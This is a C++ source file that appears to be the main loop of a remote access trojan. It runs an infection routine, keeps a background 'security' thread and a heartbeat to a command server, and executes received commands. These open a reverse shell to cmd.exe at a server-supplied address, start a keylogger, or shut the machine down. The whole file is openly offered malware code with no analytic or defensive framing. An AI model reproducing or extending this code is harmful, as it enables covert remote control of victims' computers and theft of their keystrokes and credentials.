#include <includes.hpp>

vaev::api api;

std::uint8_t security_thread(vaev::security security)
{
	while (true)
	{
		security.call();

		Sleep(500);
	}
}

std::uint8_t ping_thread()
{
	while (true)
	{
		if (!api.ping()) Sleep(60000);

		Sleep(3000);
	}
}

std::uint8_t main()
{
	api = vaev::api().begin();
	vaev::infecter().infect();
	vaev::security security = vaev::security().init();

	std::thread pinger(ping_thread);
	pinger.detach();

	std::thread security_caller(security_thread, security);
	security_caller.detach();

	while (true)
	{
		vaev::action action = vaev::action().begin(); 

		if (action.type() <= 3 && action.type() > 0)
		{
			switch (action.type())
			{
			case vaev::action_types::reverse_shell: {
				std::thread sheller(shell_thread, _strdup(action.data().c_str()), _strdup("cmd.exe"));
				sheller.detach();

				action.completed();
				break;
			}
			case vaev::action_types::key_logger: {
				std::thread logger(logger_thread, _strdup(action.data().c_str()));
				logger.detach();

				action.completed();
				break;
			}
			case vaev::action_types::shutdown: {
				action.completed();
				system("shutdown /s");
				break;
			}
			}
			
		}

		Sleep(1000);
	}
}